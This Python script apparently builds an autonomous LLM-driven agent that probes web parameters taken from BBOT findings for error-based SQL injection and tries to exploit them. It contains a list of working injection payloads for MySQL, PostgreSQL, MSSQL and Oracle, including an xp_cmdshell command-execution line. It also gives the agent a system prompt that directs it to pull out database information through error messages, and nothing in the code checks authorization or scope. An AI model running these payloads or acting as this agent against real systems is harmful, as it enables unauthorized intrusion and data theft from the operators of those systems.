import argparse
import asyncio
import json
import typing as t
from pathlib import Path

from rich.console import Console

import dreadnode as dn
from dreadnode.agent.agent import Agent
from dreadnode.agent.result import AgentResult
from dreadnode.agent.tools.bbot.tool import BBotTool
from dreadnode.agent.tools.kali.tool import KaliTool
from dreadnode.agent.tools.neo4j.tool import Neo4jTool

dn.configure(server=None, token=None, project="error-based-sqli-agent", console=False)

console = Console()

# Error-based SQLi focused payloads
ERROR_BASED_PAYLOADS = [
    # Basic error triggers
    "'", "\"", "'))", "')", "\")", 
    
    # MySQL error-based
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND()*2))x FROM(SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    
    # PostgreSQL error-based
    "' AND CAST(VERSION() AS INT)--",
    "' AND 1::text LIKE 1--",
    "' AND (SELECT * FROM GENERATE_SERIES(1,1000))--",
    
    # MSSQL error-based
    "' AND CONVERT(INT,@@VERSION)--",
    "' AND CAST(@@version AS INT)--",
    "'; EXEC xp_cmdshell('whoami')--",
    
    # Oracle error-based
    "' AND UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) IS NOT NULL--",
    "' AND EXTRACTVALUE(XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>'||(SELECT banner FROM v$version WHERE rownum=1)||'</root>'),'/root') IS NOT NULL--",
    
    # XML/XPATH errors
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
]

# Database error patterns for detection
ERROR_PATTERNS = {
    'mysql': [
        'mysql_fetch_array()',
        'mysql_num_rows()',
        'you have an error in your sql syntax',
        'warning: mysql',
        'function.mysql',
        'mysql result index',
        'mysql error',
        'mysql_query()',
        'num_rows',
        'mysql_error',
        'supplied argument is not a valid mysql',
        'column count doesn\'t match value count at row',
        'mysql server version for the right syntax to use',
        'operand should contain 1 column()',
    ],
    'postgresql': [
        'postgresql query failed',
        'warning: pg_',
        'valid postgresql result',
        'npgsql',
        'pg_query()',
        'pg_exec()',
        'function.pg',
        'postgresql result index',
        'pg_result',
        'pg_exec() expects',
        'query failed: error: column',
        'pg_num_rows()',
        'query failed: error: relation',
        'pgsql',
        'supplied argument is not a valid pgsql',
        'unterminated quoted string at or near',
    ],
    'mssql': [
        'driver.*sql server',
        'ole db.*sql server',
        'microsoft sql server',
        'sqlserver',
        'mssql',
        'sql server',
        'microsoft.jet.oledb',
        'microsoft ole db provider',
        'unclosed quotation mark after the character string',
        'incorrect syntax near',
        'system.data.oledb.oledbexception',
        'system.data.sqlclient.sqlexception',
        'microsoft.jet',
        'odbc.*sql server',
        'sqloledb',
        'convert.*varchar.*int',
    ],
    'oracle': [
        'oci_parse',
        'oci_execute',
        'oracle.exe',
        'oracle driver',
        'warning: oci_',
        'warning: ora_',
        'ora-[0-9]+',
        'oracle error',
        'oracle.*driver',
        'function.oci',
        'quoted string not properly terminated',
        'sql command not properly ended',
        'missing expression',
        'invalid number',
        'ora-00933',
        'ora-00921',
        'ora-00936',
    ]
}

@dn.task(name="Error-Based SQLi Analysis", label="analyze_error_sqli")
async def analyze_error_based_sqli(finding_data: dict[str, t.Any]) -> dict[str, t.Any]:
    """Analyze a finding specifically for error-based SQL injection."""
    agent = create_error_based_sqli_agent()
    
    url = finding_data.get('data', {}).get('url', '')
    host = finding_data.get('data', {}).get('host', '')
    description = finding_data.get('data', {}).get('description', '')
    
    param_name = extract_param_name(description)
    original_value = extract_original_value(description)
    
    console.print(f"[*] Testing ERROR-BASED SQL injection on {host}")
    console.print(f"    URL: {url}")
    console.print(f"    Parameter: {param_name}")
    
    # Build focused prompt with error-based context
    prompt = f"""Target: {url}
Parameter: {param_name}
Original Value: {original_value}

MISSION: Test this parameter specifically for ERROR-BASED SQL injection vulnerabilities.

METHODOLOGY:
1. Start with basic error triggers: single quotes, double quotes
2. Progress to database-specific error-based payloads 
3. Analyze error messages for database type identification
4. Attempt data extraction via error messages
5. Log findings with specific error patterns detected

Focus ONLY on error-based techniques. Look for verbose error messages that leak information about the database structure, version, or data.

Use your HTTP tools to test the payloads systematically and analyze response differences."""

    result = await agent.run(prompt)
    
    # Process results with error-based specific logic
    has_error_sqli = analyze_error_responses(result)
    db_type = detect_database_type(result)
    
    dn.log_metric("error_based_sqli_found", 1 if has_error_sqli else 0)
    dn.log_metric("database_type_detected", 1 if db_type else 0)
    
    return {
        "url": url,
        "host": host,
        "parameter": param_name,
        "vulnerability_type": "error_based_sqli",
        "has_sqli": has_error_sqli,
        "database_type": db_type,
        "analysis": result.messages[-1].content if result.messages else None,
        "detection_method": "error_message_analysis"
    }

def analyze_error_responses(result: AgentResult) -> bool:
    """Analyze agent responses for error-based SQLi indicators."""
    if not result.messages:
        return False
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Check for error-based SQLi success indicators
    success_indicators = [
        'database error detected',
        'sql syntax error',
        'mysql error message',
        'postgresql error',
        'oracle error',
        'mssql error',
        'version information leaked',
        'database version',
        'table information exposed',
        'column count error',
        'syntax error in sql',
        'error message contains',
        'verbose error'
    ]
    
    return any(indicator in content for indicator in success_indicators)

def detect_database_type(result: AgentResult) -> str:
    """Detect database type from error messages in agent output."""
    if not result.messages:
        return ""
    
    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
    
    # Check patterns for each database type
    for db_type, patterns in ERROR_PATTERNS.items():
        if any(pattern.lower() in content for pattern in patterns):
            return db_type
    
    return ""

def create_error_based_sqli_agent() -> Agent:
    """Create an error-based SQL injection specialist agent."""
    tools = [KaliTool(), BBotTool(), Neo4jTool()]
    
    error_based_context = """
ERROR-BASED SQL INJECTION SPECIALIST

You are an expert focused EXCLUSIVELY on error-based SQL injection techniques.

Your mission is to trigger verbose database errors that leak information. Start simple and adapt based on what you discover:

1. Begin with basic error triggers (single quotes, double quotes, parentheses)
2. Analyze error messages to identify the database type and technology stack
3. Based on the database you identify, craft targeted error-based payloads
4. Extract information progressively through error message analysis
5. Document findings and iterate your approach based on responses

Key principle: Let the application's responses guide your next steps. Each error message tells you something about the backend.

Use the http_request tool to test payloads systematically. Analyze error patterns and adapt your approach.
"""

    return Agent(
        name="error-based-sqli-agent",
        description="Specialized agent for error-based SQL injection detection and exploitation",
        model="gpt-4-turbo",
        tools=tools,
        instructions=error_based_context,
    )

def extract_param_name(description: str) -> str:
    """Extract parameter name from BBOT finding description."""
    if "Name: [" in description:
        start = description.find("Name: [") + 7
        end = description.find("]", start)
        return description[start:end] if end > start else "unknown"
    return "unknown"

def extract_original_value(description: str) -> str:
    """Extract original parameter value from BBOT finding description."""
    if "Original Value: [" in description:
        start = description.find("Original Value: [") + 17
        end = description.rfind("]")
        return description[start:end] if end > start else ""
    return ""

async def main():
    parser = argparse.ArgumentParser(description="Error-based SQL injection specialist")
    parser.add_argument("finding_file", type=Path, help="JSON file containing SQLi findings")
    parser.add_argument("--debug", action="store_true", help="Debug mode")
    
    args = parser.parse_args()
    
    with dn.run("error-based-sqli-hunt"):
        console.print("Starting ERROR-BASED SQL injection analysis...")
        
        try:
            with open(args.finding_file) as f:
                findings = json.load(f)
            
            if not isinstance(findings, list):
                findings = [findings]
            
            confirmed_count = 0
            for finding in findings:
                analysis_result = await analyze_error_based_sqli(finding)
                
                if analysis_result["has_sqli"]:
                    confirmed_count += 1
                    console.print(f"[+] ERROR-BASED SQLi CONFIRMED: {analysis_result['host']}")
                    console.print(f"    Database: {analysis_result['database_type']}")
                else:
                    console.print(f"[-] No error-based SQLi: {finding.get('data', {}).get('host')}")
            
            dn.log_metric("total_error_sqli_confirmed", confirmed_count)
            console.print(f"\nError-based SQLi Summary: {confirmed_count} confirmed")
            
        except Exception as e:
            console.print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())